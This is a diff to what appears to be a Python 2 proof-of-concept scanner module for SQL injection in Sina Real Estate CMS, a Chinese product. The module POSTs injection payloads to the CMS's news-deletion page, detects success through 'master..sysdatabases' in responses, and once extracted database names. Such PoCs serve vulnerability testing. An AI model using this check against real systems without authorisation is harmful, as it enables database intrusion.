@@ -8,7 +8,7 @@ class Vuln(ABVuln):
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
     disclosure_date = ''  # 漏洞公布时间
-    desc = '''模版漏洞描述
+    desc = '''
     新浪地产CMS存设计缺陷和多处sql注入，
     设计缺陷出现在登录时图片验证码使用一次未失效，可撞库和暴破。
     ''' # 漏洞描述
@@ -39,12 +39,9 @@ class Poc(ABPoc):
                 'housenewsIds': payload, 'Button1': '%E7%A1%AE%E5%AE%9A'}
                 url = self.target + '/news/deletenews.aspx'
                 conn = requests.post(url, data=body, headers=headers, verify=False, allow_redirects=False)
-                conn.close()
-                print ".",
-                if conn.status_code == 200:
-                    break
-                else:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+                # conn.close()
+                if conn.status_code == 200 and "master..sysdatabases" in conn.text:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞, url={url}'.format(target=self.target, name=self.vuln.name,url=url))
         except Exception, e:
             self.output.info('执行异常：{}'.format(e))
 
@@ -64,15 +61,13 @@ class Poc(ABPoc):
                 conn = requests.post(url, data=body, headers=headers, verify=False, allow_redirects=False)
                 html_doc = conn.content
                 conn.close()
-                print ".",
-                if conn.status_code == 200:
-                    break
+                if conn.status_code == 200  and "master..sysdatabases" in conn.text:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;遍历的数据为:{database}, url={url}'.format(target=self.target, name=self.vuln.name, database=databases,url=url))
                 # get tables from response
-                begain = html_doc.index('nvarchar')
-                end = html_doc.index('int')
-                database = html_doc[begain + 14:end - 24]
-                databases.append(database)
-            self.output.report(self.vuln, '发现{target}存在{name}漏洞;遍历的数据为:{database}'.format(target=self.target, name=self.vuln.name, database=databases))
+                # begain = html_doc.index('nvarchar')
+                # end = html_doc.index('int')
+                # database = html_doc[begain + 14:end - 24]
+                # databases.append(database)
         except Exception, e:
             self.output.info('执行异常：{}'.format(e))
 
